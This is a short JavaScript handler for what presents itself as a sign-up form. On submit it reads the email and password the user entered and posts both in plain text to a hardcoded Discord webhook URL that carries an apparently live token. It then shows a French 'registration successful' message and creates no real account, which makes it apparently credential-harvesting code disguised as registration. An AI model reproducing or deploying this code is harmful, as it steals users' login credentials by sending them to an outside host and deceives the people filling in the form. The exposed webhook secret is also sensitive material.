const form = document.getElementById('myForm');
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  const formData = new FormData(form);
  const email = formData.get('email');
  const password = formData.get('password');
  const webhookUrl = 'https://discord.com/api/webhooks/1103319312900567192/3SWoHjepeUxQEShb8Y2SFO-DJZNED1Cu6z49g6RT0_Z_6Zref4z5_0rYWQ4X9zvoilZN';
  const payload = {
    content: `Nouvelle inscription:\nEmail: ${email}\nMot de passe: ${password}`
  };
  await fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  });
  alert('Inscription réussie!');
  form.reset();
});
